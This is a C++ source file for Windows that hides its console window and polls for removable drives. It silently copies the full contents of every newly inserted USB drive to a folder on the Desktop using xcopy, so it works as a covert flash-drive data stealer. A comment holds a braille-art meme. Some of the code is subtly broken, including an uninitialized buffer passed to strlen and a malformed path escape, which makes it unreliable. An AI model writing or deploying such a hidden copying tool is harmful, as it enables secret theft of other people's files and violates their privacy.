#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <exception>

#define MAX_LETTER 26
char PREV_DRIVE_LIST[MAX_LETTER];
char NEW_DRIVE_LIST[MAX_LETTER];

/* get drive list in char array */

void copyingFile(char driveLet)
{
    // creating a string for console command
    std::string cmd("xcopy ");
    cmd += driveLet;
    cmd += ":\ %UserProfile%\\Desktop\\Your_Flash_Drive /E /I";


    system(cmd.c_str());
    
/*———————————No Linux?———————————
⠀⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝
⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇
⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀
⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀
⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀
⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
—————————————————————————————*/

    
}

void getUSBStorageDeviceList(char drive[]) {

    char szLogicalDrives[MAX_PATH];
    size_t size = strlen(szLogicalDrives) + 1;
    wchar_t* text = new wchar_t[size];

    size_t outSize;
    mbstowcs_s(&outSize, text, size, szLogicalDrives, size - 1);

    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, text); // text = szLogicalDrives
    WCHAR* szSingleDrive = text;

    while (*szSingleDrive) {

        UINT nDriveType = GetDriveType(szSingleDrive);

        if (nDriveType == DRIVE_REMOVABLE) {
            char letter = szSingleDrive[0];
            drive[letter - 65] = letter;
        }

        szSingleDrive += wcslen(szSingleDrive) + 1; // next drive 
    }
}

int main(void) {

    ShowWindow(GetConsoleWindow(), SW_HIDE); // hiding the console

    for (int i = 0; i < MAX_LETTER; i++) {
        PREV_DRIVE_LIST[i] = '0';
        NEW_DRIVE_LIST[i] = '0';
    }
    // initial drive list which is already attached 
    getUSBStorageDeviceList(PREV_DRIVE_LIST);

    while (1) {

        getUSBStorageDeviceList(NEW_DRIVE_LIST);

        /* Check for insertion and removabal*/

        for (int i = 0; i < MAX_LETTER; i++) {
            // check for new drive
            if ((NEW_DRIVE_LIST[i] >= 65 && NEW_DRIVE_LIST[i] <= 89) && (PREV_DRIVE_LIST[i] == '0')) {
 
                copyingFile(NEW_DRIVE_LIST[i]);
                PREV_DRIVE_LIST[i] = NEW_DRIVE_LIST[i];   
            }
        }
        
        // fill all zero 
        for (int i = 0; i < MAX_LETTER; i++) {
            NEW_DRIVE_LIST[i] = '0';
        }
        // update NEW drive list
        getUSBStorageDeviceList(NEW_DRIVE_LIST);

        for (int i = 0; i < MAX_LETTER; i++) {
            // check for removed drive
            if ((PREV_DRIVE_LIST[i] >= 65 && PREV_DRIVE_LIST[i] <= 89) && (NEW_DRIVE_LIST[i] == '0')) {
                PREV_DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
            }
        }
        Sleep(2000);
    }

    return 0;
}